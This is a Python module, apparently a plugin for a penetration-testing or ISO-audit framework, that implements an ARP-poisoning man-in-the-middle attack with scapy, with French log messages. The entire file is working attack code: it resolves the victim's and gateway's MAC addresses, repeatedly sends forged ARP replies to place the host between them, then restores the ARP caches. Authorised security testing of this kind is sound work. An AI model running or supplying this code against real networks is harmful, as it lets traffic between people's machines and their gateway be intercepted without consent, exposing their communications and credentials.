from __future__ import annotations
import logging
import os
import time

from scapy.all import ARP, Ether, conf, send, srp

from ..core.plugin_base import AttackModule, AttackResult
from ..core.registry import register

logger = logging.getLogger(__name__)


def get_mac(ip: str, timeout: float = 3.0) -> str | None:
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(packet, timeout=timeout, verbose=False)
    if answered:
        return answered[0][1].hwsrc
    return None


def _spoof(target_ip: str, target_mac: str, spoof_ip: str) -> None:
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def _restore(dest_ip: str, dest_mac: str, source_ip: str, source_mac: str) -> None:
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)


def _is_root() -> bool:
    return hasattr(os, "geteuid") and os.geteuid() == 0


@register
class ArpMitmModule(AttackModule):
    name = "arp_mitm"
    iso_controls = ("A.13",)

    def run(
        self,
        target: str,
        gateway_ip: str | None = None,
        interval: float = 2.0,
        duration: float = 30.0,
        **kwargs,
    ) -> AttackResult:
        if not _is_root():
            return AttackResult(
                module_name=self.name,
                success=False,
                summary=(
                    "L'attaque ARP MITM nécessite des privilèges root pour envoyer des paquets ARP. "
                    "Exécutez le script avec sudo ou en tant qu'utilisateur root."
                ),
                evidence={},
            )

        if gateway_ip is None:
            raise ValueError(
                "gateway_ip est obligatoire, ex: gateway_ip='192.168.1.1' "
                "(impossible de le déduire fiablement selon les réseaux)"
            )

        victim_ip = target
        conf.verb = 0

        victim_mac = get_mac(victim_ip)
        if victim_mac is None:
            return AttackResult(
                module_name=self.name,
                success=False,
                summary=f"Impossible de résoudre l'adresse MAC de la victime {victim_ip}.",
                evidence={"victim_ip": victim_ip},
            )

        gateway_mac = get_mac(gateway_ip)
        if gateway_mac is None:
            return AttackResult(
                module_name=self.name,
                success=False,
                summary=f"Impossible de résoudre l'adresse MAC de la passerelle {gateway_ip}.",
                evidence={"gateway_ip": gateway_ip},
            )

        packets_sent = 0
        elapsed = 0.0
        interrupted = False

        try:
            logger.info("Empoisonnement ARP démarré : %s <-> %s", victim_ip, gateway_ip)
            while elapsed < duration:
                _spoof(victim_ip, victim_mac, gateway_ip)
                _spoof(gateway_ip, gateway_mac, victim_ip)
                packets_sent += 2
                time.sleep(interval)
                elapsed += interval
        except KeyboardInterrupt:
            interrupted = True
            logger.warning("Interruption manuelle, restauration en cours...")
        finally:
            _restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
            _restore(gateway_ip, gateway_mac, victim_ip, victim_mac)
            logger.info("Caches ARP restaurés.")

        if interrupted:
            summary = f"Interrompu après {elapsed:.0f}s, caches restaurés."
        else:
            summary = (
                f"Empoisonnement ARP mené {elapsed:.0f}s entre {victim_ip} et "
                f"{gateway_ip} ({packets_sent} paquets forgés envoyés), caches restaurés."
            )

        return AttackResult(
            module_name=self.name,
            success=packets_sent > 0 and not interrupted,
            summary=summary,
            evidence={
                "victim_ip": victim_ip,
                "victim_mac": victim_mac,
                "gateway_ip": gateway_ip,
                "gateway_mac": gateway_mac,
                "packets_sent": packets_sent,
                "duration_s": elapsed,
            },
        )